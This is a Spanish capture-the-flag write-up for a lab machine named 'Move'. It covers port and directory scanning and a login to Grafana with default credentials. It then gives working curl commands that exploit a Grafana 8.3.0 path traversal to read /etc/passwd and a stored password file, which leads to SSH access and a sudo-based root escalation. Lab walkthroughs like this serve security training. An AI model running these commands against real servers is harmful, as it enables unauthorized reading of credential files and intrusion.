---
description: '🧠Dificultad: Fácil | 🔓24/01/2026'
---

# 🟩 Move

## 🕵️ Reconocimiento

Realizamos un escaneo de puertos con nmap:

```bash
nmap -sC -sV -Pn $IPTARGET
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que la máquina está corriendo un servicio web con Apache, SSH y Grafana. Con un escaneo de directorios encontramos lo siguiente:

{% code overflow="wrap" %}
```bash
ffuf -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u "http://$IPTARGET/FUZZ" -e .html,.php,.txt,.xml,.js
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

La única página que nos interesa es `maintenance.html`, ya que en `index.html` se encuentra la página default de Apache.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

De momento esta información no nos resulta relevante ya que no tenemos acceso a la máquina.

Si le echamos un vistazo a la página de Grafana, vemos que hay un login. Probando con la combinación `admin:admin` nos deja cambiar la contraseña de administrador (seguramente porque sea el primer inicio de sesión con este usuario).

Dentro del panel no encontramos nada relevante, pero si verificamos la versión de Grafana (8.3.0) vemos que es vulnerable a path traversal, por lo que podríamos llegar a acceder a archivos que estén fuera del directorio de Grafana.

{% code overflow="wrap" %}
```bash
curl --path-as-is http://172.17.0.2:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Con la opción `--path-as-is` hacemos que curl no corrija los `../` de la URL, ya que precisamente queremos utilizarlos para realizar un path traversal.

## 🚪 Ganando acceso

Podemos probar a leer el archivo que nos encontramos anteriormente (`/tmp/pass.txt`):

{% code overflow="wrap" %}
```bash
curl --path-as-is http://172.17.0.2:3000/public/plugins/alertlist/../../../../../../../../tmp/pass.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si probamos a entrar por SSH con el usuario sacado del fichero `/etc/passwd` (el único que posee una shell interactiva) y esta contraseña, obtenemos acceso a la máquina.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## 💥 Escalada de privilegios

Verificamos los permisos que tenemos como `sudo` :

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Podemos correr como root el fichero `maintenance.py` usando `python3`. Veamos qué código tiene el fichero:

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como tenemos permisos de escritura sobre este fichero, podemos modificarlo.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Con este código conseguiremos una shell como root si lo ejecutamos con sudo.

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
